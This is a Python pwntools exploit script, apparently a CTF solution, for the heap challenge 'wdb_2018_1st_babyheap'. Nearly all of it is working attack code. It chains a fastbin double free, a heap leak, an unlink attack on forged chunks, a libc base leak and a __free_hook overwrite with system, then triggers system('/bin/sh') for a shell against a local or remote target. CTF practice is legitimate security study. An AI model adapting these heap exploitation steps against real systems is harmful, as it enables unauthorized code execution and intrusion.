
from pwn import *

context(os='linux', arch='amd64', log_level='info')

elf = ELF('./wdb_2018_1st_babyheap')
libc = ELF('./libc-2.23.so')

# 默认本地，远程：python3 exp.py REMOTE HOST=xxx PORT=xxx
if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
else:
    io = process(elf.path)

def send_data(data):
    # 题目最多读 0x20 字节，短输入用换行结束
    io.sendafter(b'Content:', data if len(data) == 0x20
                 else data + (b'' if data.endswith(b'\n') else b'\n'))

def add(idx, data):
    io.sendlineafter(b'Choice:', b'1')
    io.sendlineafter(b'Index:', str(idx).encode())
    send_data(data)

def edit(idx, data):
    io.sendlineafter(b'Choice:', b'2')
    io.sendlineafter(b'Index:', str(idx).encode())
    send_data(data)

def show(idx):
    io.sendlineafter(b'Choice:', b'3')
    io.sendlineafter(b'Index:', str(idx).encode())
    return io.recvline(keepends=False)

def delete(idx):
    io.sendlineafter(b'Choice:', b'4')
    io.sendlineafter(b'Index:', str(idx).encode())

def stop(n):
    if args.DEBUG:
        log.info(f'Pause {n}, PID = {io.pid}')
        pause()

# 1. 初始化堆布局
add(0, b'a' * 0x20)
add(1, b'b' * 8 + p64(0x21))
add(2, b'/bin/sh\x00' + b'c' * 0x18)
add(3, p64(0) + p64(0x31) + p64(0) + p64(0x31))
add(6, p64(0) + p64(0x21))

# 2. Fastbin Double Free
delete(0)
delete(1)
delete(0)
stop(1)

# 3. 泄露堆地址
heap_addr = u64(show(0).ljust(8, b'\x00'))
log.success(f'heap_addr = {heap_addr:#x}')

# 4. Fastbin Attack，伪造较大的 chunk
edit(0, p64(heap_addr - 0x20) + p64(0x21)
        + p64(0) + p64(0x21))

ptr = 0x602060  # 必须与当前 ELF 的 BSS 布局一致

add(4, p64(0) + p64(0x31)
       + p64(ptr - 0x18) + p64(ptr - 0x10))

add(5, p64(ptr - 0x18) + p64(ptr - 0x10)
       + p64(0x20) + p64(0xa0))
stop(2)

# 5. 构造 Unlink 所需的 fake chunk
delete(0)
add(7, p64(0) + p64(0x21)
       + p64(ptr - 0x18) + p64(ptr - 0x10))
stop(3)

# 6. 触发 Unlink，同时进入 Unsorted Bin
delete(1)
stop(4)

# 7. 泄露 libc
leak = u64(show(5)[-6:].ljust(8, b'\x00'))
libc.address = leak - 0x3c4b78

log.success(f'libc_base = {libc.address:#x}')

# 8. 覆盖 __free_hook 为 system
free_hook = libc.sym['__free_hook']
system = libc.sym['system']

log.success(f'__free_hook = {free_hook:#x}')
log.success(f'system = {system:#x}')

edit(0, b'a' * 0x18 + p64(free_hook))
stop(5)

edit(0, p64(system))
stop(6)

# 9. 触发 system("/bin/sh")
delete(2)
io.interactive()
